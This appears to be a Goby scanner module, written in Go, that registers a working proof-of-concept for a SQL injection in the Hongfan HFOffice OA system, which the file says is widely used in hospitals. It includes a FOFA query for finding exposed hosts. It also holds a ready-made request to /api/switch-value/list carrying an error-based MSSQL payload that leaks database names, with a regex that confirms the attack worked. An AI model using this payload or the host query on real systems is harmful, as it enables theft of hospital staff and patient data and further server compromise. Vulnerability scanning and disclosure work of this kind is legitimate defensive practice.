package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "HFOffice OA System SQL Injection",
    "Description": "<p>Hongfan HFOffice is an OA system that is widely used in hospitals, and there is a SQL injection vulnerability in one of its api interfaces.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions</p>",
    "Impact": "HFOffice OA System SQL Injection",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "HFOffice",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "红帆 HFOffice 系统SQL注入漏洞",
            "Description": "<p>红帆 HFOffice 是一款广泛应用于医院的OA系统，其某api接口存在SQL注入漏洞。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">红帆 HFOffice&nbsp;</span>是一款广泛应用于医院的OA系统，其某api接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：</span><a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "HFOffice",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "HFOffice OA System SQL Injection",
            "Description": "<p>Hongfan HFOffice is an OA system that is widely used in hospitals, and there is a SQL injection vulnerability in one of its api interfaces.<span style=\"color: var(--primaryFont-color);\"></span></p><p><span style=\"color: var(--primaryFont-color);\">In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions</span></p>",
            "Impact": "HFOffice OA System SQL Injection",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</span><br></p><p><a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a><br></p><p></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Product": "HFOffice",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"./config/pc-app-config.js\" && title=\"HFOffice\"",
    "GobyQuery": "body=\"./config/pc-app-config.js\" && title=\"HFOffice\"",
    "Author": "Zther0@163.com",
    "Homepage": "http://www.ioffice.cn/newsinfo/2052606.html",
    "DisclosureDate": "2022-08-02",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c89905a7",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Cache-Control": "max-age=0",
                    "sec-ch-ua": "'.Not/A)Brand';v='99', 'Google Chrome';v='103', 'Chromium';v='103'",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "'Windows'",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "400",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "(在将(.*?)值(.*?)转换成数据类型(.*?)时失败)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c89905a7",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Cache-Control": "max-age=0",
                    "sec-ch-ua": "'.Not/A)Brand';v='99', 'Google Chrome';v='103', 'Chromium';v='103'",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "'Windows'",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "400",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "(在将(.*?)值(.*?)转换成数据类型(.*?)时失败)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sql_test",
            "type": "input",
            "value": "convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)),1,0,%27%27))",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10501"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
